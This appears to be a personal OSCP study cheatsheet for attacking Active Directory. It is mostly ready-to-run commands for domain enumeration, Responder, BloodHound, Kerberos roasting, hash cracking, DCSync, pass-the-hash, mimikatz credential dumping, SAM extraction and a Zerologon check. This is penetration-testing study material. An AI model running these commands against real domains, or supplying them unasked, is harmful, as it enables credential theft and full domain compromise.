---
title: Active Directory
author: linatl
category: "OSCP"
date: "2021-03-14 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---


###### Basic Domain Enumeration Commands
```
> net user /domain
> net user some_admin /domain
> net group /domain
> net accounts

Powershell:
> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent
Domain()
```

###### Responder
```
> responder -I eth0 -rdw
```

###### Bloodhound
```
Bloodhound documentation:
https://bloodhound.readthedocs.io/en/latest/

Installation:
> sudo apt install bloodhound
> sudo pip3 install bloodhound

First, gather the data with an ingestor, either the bloodhound-python script from fox-it or SharpHound.Then import the json files in the neo4j database.
> (sudo) neo4j console
starts on localhost:7687

Example bloodhound-python:
> bloodhound-python -c All -u 'username' -p 'password' -gc "MACHINE.domain.local" -dc "MACHINE.domain.local" -d "domain.local" -ns 10.10.10.10

Example SharpHound
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
> Import-module .\SharpHound.ps1
> Invoke-Bloodhound -CollectionMethod All [-d domain.local]
Or at once:
> powershell -exec bypass -command "& { Import-Module SharpHound.ps1; Invoke-Bloodhound -CollectionMethod All; }"
```

###### PowerView
```
> cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ./

> Import-Module .\PowerView.ps1
> Get-NetLoggedon -ComputerName computer1
> Get-NetSession -ComputerName dc01
```

###### Kerberos ~ validating usernames
```
https://github.com/ropnop/kerbrute
./kerbrute userenum --dc 10.10.10.10 -d domain.htb users.txt
```


###### Kerberos ~ AS-REP Roasting
```
From external:
> impacket-GetNPUsers domain.local/ -format john -usersfile wordlist -no-pass -dc-ip 10.10.10.10

From internal:
https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks

Password dictionary attack:
> john tgt-file --wordlist=/usr/share/wordlists/rockyou.txt
or:
> hashcat -a 0 -m 18200 tgt-file /usr/share/wordlists/rockyou.txt --force
```

###### Kerberos ~ Kerberoasting
```
From external:
> GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/username -save -outputfile tgsfile.out

From internal:
https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks


Password dictionary attack:
> hashcat -m 13100 -a 0 tgsfile.out /usr/share/wordlists/rockyou.txt --force
or:
> python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticketname
```


##### DS-SYNC attack
```
with impacket-secretsdump:
> impacket-secretsdump domain/username@10.10.10.10
> impacket-secretsdump domain/username@10.10.10.10 -just-dc
> impacket-secretsdump domain/username:password@10.10.10.10

with mimikatz:
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
> lsadump::dcsync /domain:domain.local /user:Administrator
```



###### Pass The Hash with CrackMapExec
```

```

###### Pass the Hash with PTH
```
> pth-winexe -U username%hAsHPaRt1:hAsHPaRt2 //10.10.10.10 cmd

```

###### Overpass the hash
```
https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
```

###### Pass the ticket
```
https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
```



###### Mimikatz
```
> .\mimikatz.exe
Then:
> privilege::debug
> sekurlsa::logonpasswords
> sekurlsa::tickets
> kerberos::list /export
> sekurlsa::logonpasswords
> sekurlsa::pth /user:some_admin /domain:domain.com /ntlm:hAsHPaRt2 /run:PowerShell.exe
```

###### Hashdump (manual)
```
Dumping SAM hashes from CMD:
https://miloserdov.org/?p=4129

> reg save hklm\sam c:\sam
> reg save hklm\system c:\system

Location:
C:/Windows/System32/config/SAM
C:/Windows/System32/config/SYSTEM

```


###### Zerologon (probably going to break the domain...)
```
> searchsploit -m 49871.py
> python3 49871.py -do check -target NETBIOSNAME -ip 10.10.10.10
```


###### HiveNightmare
```
https://github.com/GossiTheDog/HiveNightmare

Works on all supported versions of Windows 10, where System Protection is enabled (should be enabled by default in most configurations).
Check for vuln by checking if the patch for CVE-2021–36934 is installed, and by checking if system protection is enabled (with rstrui.exe ?)
```
